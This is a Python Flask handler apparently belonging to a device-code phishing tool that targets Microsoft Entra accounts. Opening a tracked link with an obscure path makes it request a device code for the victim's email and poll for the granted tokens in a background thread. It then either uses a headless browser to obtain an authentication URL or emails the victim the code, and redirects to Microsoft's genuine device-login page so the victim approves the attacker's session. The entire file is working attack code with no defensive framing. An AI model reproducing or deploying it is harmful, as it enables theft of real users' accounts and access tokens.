import logging
import re
import threading

from flask import Flask, request, redirect

from ..database import load_config, save_email_scanned
from ..email import send_email
from .devicecode import init_device_code
from .headless import enter_device_code_with_headless_browser
from .poll import auth_poll

logger = logging.getLogger(__name__)

REDIRECT_URL = "https://microsoft.com/devicelogin"

app = Flask(__name__)


@app.route("/CkyAAx7xES", methods=["GET"])
def handler():
    email = request.args.get("email", "")
    auto = request.args.get("auto", "")

    if not email:
        logger.info("[---] No email address found in request")
        return redirect(REDIRECT_URL, code=302)

    # Basic email validation
    if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
        logger.info("[---] Invalid email address provided: %s", email)
        return redirect(REDIRECT_URL, code=302)

    # Track scan (non-critical)
    logger.info("[%s] Link triggered", email)
    try:
        save_email_scanned(email)
    except Exception:
        pass

    # 1. Request device code
    config = load_config()
    entra_config = config.entra_config
    request_config = config.request_config

    try:
        device_code_result = init_device_code(email, entra_config, request_config)
    except Exception as e:
        logger.error("[%s] Error initializing device code: %s", email, e)
        return redirect(REDIRECT_URL, code=302)

    # 2. Start polling in background
    poll_thread = threading.Thread(
        target=auth_poll,
        args=(email, device_code_result, entra_config, request_config),
        daemon=True,
    )
    poll_thread.start()

    # 3a. Attempt headless browser auth URL retrieval
    if auto == "true":
        logger.info("[%s] Retrieving authentication URL", email)
        try:
            auth_url = enter_device_code_with_headless_browser(
                device_code_result, request_config
            )
            logger.info("[%s] Successfully retrieved authentication URL: %s", email, auth_url)
            return redirect(auth_url, code=302)
        except Exception as e:
            logger.info(
                "[%s] Failed to retrieve authentication URL, falling back to device code email: %s",
                email, e,
            )

    # 3b. Send device code email
    email_config = config.email_config
    smtp_config = config.smtp_config

    if not all([smtp_config.host, smtp_config.port, smtp_config.username, smtp_config.password]):
        logger.info("[%s] SMTP config is invalid", email)
        return redirect(REDIRECT_URL, code=302)

    if not all([email_config.sender, email_config.subject, email_config.body]):
        logger.info("[%s] Email config is invalid", email)
        return redirect(REDIRECT_URL, code=302)

    body = email_config.body.replace("{DEVICE_CODE}", device_code_result.user_code, 1)

    try:
        send_email(smtp_config, email_config.sender, [email], email_config.subject, body)
    except Exception as e:
        logger.error("[%s] Error sending email: %s", email, e)
        return redirect(REDIRECT_URL, code=302)

    logger.info("[%s] Email sent", email)
    return redirect(REDIRECT_URL, code=302)
